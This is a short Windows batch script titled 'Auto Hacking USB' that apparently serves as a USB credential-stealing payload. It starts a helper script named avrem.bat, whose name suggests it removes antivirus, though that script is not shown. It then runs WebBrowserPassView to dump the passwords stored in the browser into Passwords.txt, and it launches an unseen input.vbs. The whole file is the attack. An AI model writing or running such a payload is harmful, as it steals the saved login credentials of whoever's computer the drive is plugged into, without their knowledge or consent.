@echo off
title Auto Hacking USB - xyse
:l33t
start .\App\avrem.bat
ping localhost -n 2 >nul
start .\App\WebPass\WebBrowserPassView.exe /stext Passwords.txt
start input.vbs
exit

